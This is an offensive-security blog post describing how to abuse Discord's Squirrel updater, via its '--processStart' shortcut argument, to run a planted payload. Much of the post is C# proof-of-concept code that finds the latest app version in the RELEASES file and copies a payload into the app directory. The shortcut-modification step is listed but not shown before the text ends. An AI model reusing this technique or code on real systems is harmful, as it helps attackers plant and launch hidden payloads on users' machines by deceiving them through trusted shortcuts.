---
title: "Using Squirrel Framework to escalate privileges"
categories:
tags:
  - squirrel-framework
og_image: "https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F1LVNvGPGQCnGZ6XXnRnz%2Fuploads%2FXU38zNUjuKfIqwvKrPY9%2F00143-2626686512.png?alt=media&token=2d9f8d64-4a11-4b43-870a-12646885a4b8"
---

The [Squirrel framework](https://github.com/Squirrel/Squirrel.Windows) can be used to trick the user and escalate privileges. Keep in mind that this is no vulnerability in Squirrel, we are just taking advantage of how it works.

In this example we will check Discord, which uses Squirrel for updating.

By checking out the Desktop shortcut that is created during installation, we can see an interesting argument passed to the Update.exe

<div style="text-align: center">
    <img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F1LVNvGPGQCnGZ6XXnRnz%2Fuploads%2FiJLHQNak3q7BAm6FeVrJ%2Fimage.png?alt=media&token=18840807-3d35-4a5c-9e1c-39d341d31ef2"/>
</div>

<p>The argument "--processStart" as per the documentation "Start an executable in the latest version of the app package".</p>

So what if we place a payload in the app directory, change the shortcut an run it?

<div style="text-align: center">
    <img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F1LVNvGPGQCnGZ6XXnRnz%2Fuploads%2FLJkoTumaUAFTM734DdXH%2Fimage.png?alt=media&token=c60d0413-5e33-456b-ad81-00675e5f4d53"/>
</div>

<p>Our payload runs:</p>

<div style="text-align: center">
    <img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F1LVNvGPGQCnGZ6XXnRnz%2Fuploads%2F6hcO8GNGP30qPD8F74kC%2Fimage.png?alt=media&token=7e8977d6-a96a-4c29-ab31-47ecf46e167d"/>
</div>

<p>So to create our little POC we need a few things:</p>

1. Find the latest version of the app package.
2. Place our payload on the latest app package directory.
3. Change the Shortcut to lunch our payload instead of the discord binary.


<h2>Finding the latest version of the app package</h2>

The version of the app is inside a file located on: ``%localappdata%\Discord\packages\RELEASES`` 

If we check the contents of this file, we have something like this: 
``230E51FC4929ACDC6DF44F0BA88B82316DDC97BF discord-updater-1.0.9013.nupkg 166474477``

What we need is this value here: ``1.0.9013``, to do this we can use regex and extract it:
```csharp
private string GetVersion(string fullPath)
{
    string releasesFilePath = Path.Combine(fullPath, "packages", "RELEASES");

    if (File.Exists(releasesFilePath))
    {
        string content = File.ReadAllText(releasesFilePath);

        string pattern = @"\d+(\.\d+)+";
        Match match = Regex.Match(content, pattern);

        if (match.Success)
            return match.Value;
    }

    return string.Empty;
}
```

The ``fullPath`` is the root directory of discord: ``%localappdata%\Discord``.

<h2>Placing our payload on the latest app package directory</h2>



```csharp
private void CopyPayloadToDestiny(string fullPath, string version, string payloadPath)
{
    string appDirectory = Path.Combine(fullPath, $"app-{version}");

    if (Directory.Exists(appDirectory))
        File.Copy(payloadPath, Path.Combine(appDirectory, Path.GetFileName(payloadPath)), true);
}
```